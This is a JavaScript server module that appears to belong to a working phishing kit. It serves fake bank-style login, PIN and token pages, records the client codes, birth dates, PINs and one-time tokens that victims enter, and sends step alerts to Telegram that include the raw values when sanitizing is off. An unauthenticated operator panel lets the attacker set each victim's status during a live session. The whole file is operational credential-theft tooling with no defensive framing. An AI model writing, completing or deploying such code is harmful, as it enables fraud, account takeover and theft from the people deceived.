import { readFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { notifyStepReached } from "./notifier.js";
import { appendSubmission, ensureVisitorSession, readSubmissions, readVisitorLog, updateVisitorStatus } from "./storage.js";
import { renderLoadingPage, renderLoginPage, renderPanelPage, renderPinPage, renderTokenPage } from "./templates.js";
import { escapeHtml, formatClientId, formatTimestamp, randomRedirectId } from "./utils.js";
import { sanitizeSubmissionPayload, shouldSanitizePayload } from "./middleware.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const publicDir = path.resolve(__dirname, "..", "public");
const logsDir = path.resolve(__dirname, "..", "data", "logs");

const STATIC_CONTENT_TYPES = {
  ".css": "text/css; charset=utf-8",
  ".gif": "image/gif",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".js": "application/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".txt": "text/plain; charset=utf-8"
};

function htmlResponse(content, status = 200) {
  return new Response(content, {
    status,
    headers: {
      "content-type": "text/html; charset=utf-8",
      "cache-control": "no-store"
    }
  });
}

function redirectResponse(location, status = 302) {
  return new Response(null, {
    status,
    headers: {
      location,
      "cache-control": "no-store"
    }
  });
}

function notFoundResponse() {
  return htmlResponse(`<h1>404</h1><p>${escapeHtml("Not found")}</p>`, 404);
}

async function serveStaticFile(pathname) {
  const sanitizedPath = pathname === "/" ? "/index.html" : pathname;
  const relativePath = sanitizedPath.replace(/^\/+/, "");
  const filePath = path.join(publicDir, relativePath);
  if (!filePath.startsWith(publicDir) || !existsSync(filePath)) {
    return null;
  }

  const body = await readFile(filePath);
  const ext = path.extname(filePath).toLowerCase();
  return new Response(body, {
    headers: {
      "content-type": STATIC_CONTENT_TYPES[ext] || "application/octet-stream",
      "cache-control": ext === ".css" ? "public, max-age=3600" : "public, max-age=86400"
    }
  });
}

async function handleIndex(request, url) {
  await ensureVisitorSession(request, url);
  return redirectResponse(`/client/login.php?redirect=${encodeURIComponent(url.href)}`);
}

async function handleSubmit(request, url) {
  const { ip, log } = await ensureVisitorSession(request, url);
  const formData = await request.formData();
  const step = String(formData.get("step") || "");
  const doSanitize = shouldSanitizePayload();

  const buildPayload = (data) => doSanitize ? sanitizeSubmissionPayload(data) : data;

  let rawPayload = {};
  let payload = {};

  if (step === "login") {
    rawPayload = {
      clientCode: String(formData.get("clientCode") || ""),
      birthDate: String(formData.get("birthDate") || "")
    };
    payload = buildPayload(rawPayload);
    await appendSubmission(request, ip, "login", payload);
  } else if (step === "pin") {
    rawPayload = { pin: String(formData.get("pin") || "") };
    payload = buildPayload(rawPayload);
    await appendSubmission(request, ip, "pin", payload);
  } else if (step === "token") {
    rawPayload = { token: String(formData.get("token") || "") };
    payload = buildPayload(rawPayload);
    await appendSubmission(request, ip, "token", payload);
  } else {
    return htmlResponse("<h1>Invalid submission</h1>", 400);
  }

  await updateVisitorStatus(ip, "wait");
  try {
    await notifyStepReached({
      ip,
      step,
      timestamp: formatTimestamp(),
      panelUrl: log?.panelUrl || `${url.origin}/panel/index.php?id_user=${encodeURIComponent(ip)}`,
      payload: doSanitize ? null : rawPayload
    });
  } catch (error) {
    console.error("Telegram notifier error:", error);
  }
  return redirectResponse(`/client/loading.php?redirect=${randomRedirectId()}`);
}

async function handlePanel(request, url) {
  const ip = url.searchParams.get("id_user");
  if (!ip) {
    return htmlResponse("<h1>Missing id_user</h1>", 400);
  }

  let message = "";
  if (request.method === "POST") {
    const formData = await request.formData();
    const status = String(formData.get("status") || "");
    if (status) {
      await updateVisitorStatus(ip, status);
      message = `Status updated to ${status}`;
    }
  }

  const log = await readVisitorLog(ip);
  const submissions = await readSubmissions(ip);
  return htmlResponse(renderPanelPage({ ip, log, submissions, message }));
}

async function handleLogFile(pathname) {
  const fileName = pathname.replace("/panel/logs/", "");
  const filePath = path.join(logsDir, fileName);
  if (!filePath.startsWith(logsDir) || !existsSync(filePath)) {
    return new Response(JSON.stringify({ status: "" }), {
      headers: {
        "content-type": "application/json; charset=utf-8",
        "cache-control": "no-store"
      }
    });
  }

  const body = await readFile(filePath, "utf8");
  return new Response(body, {
    headers: {
      "content-type": "application/json; charset=utf-8",
      "cache-control": "no-store"
    }
  });
}

export async function handleRequest(request) {
  const url = new URL(request.url);
  const { pathname } = url;

  const staticResponse = await serveStaticFile(pathname);
  if (staticResponse) {
    return staticResponse;
  }

  if ((pathname === "/" || pathname === "/index.php") && request.method === "GET") {
    return handleIndex(request, url);
  }

  if (pathname === "/client/login.php" && request.method === "GET") {
    return htmlResponse(renderLoginPage(url.searchParams.get("error") === "true"));
  }

  if (pathname === "/client/pin.php" && request.method === "GET") {
    return htmlResponse(renderPinPage(url.searchParams.get("error") === "true"));
  }

  if (pathname === "/client/token.php" && request.method === "GET") {
    return htmlResponse(renderTokenPage(url.searchParams.get("error") === "true"));
  }

  if (pathname === "/client/loading.php" && request.method === "GET") {
    const { ip } = await ensureVisitorSession(request, url);
    return htmlResponse(renderLoadingPage(ip));
  }

  if (pathname === "/client/submit.php" && request.method === "POST") {
    return handleSubmit(request, url);
  }

  if (pathname === "/panel/index.php" && (request.method === "GET" || request.method === "POST")) {
    return handlePanel(request, url);
  }

  if (pathname.startsWith("/panel/logs/") && pathname.endsWith(".json") && request.method === "GET") {
    return handleLogFile(pathname);
  }

  return notFoundResponse();
}
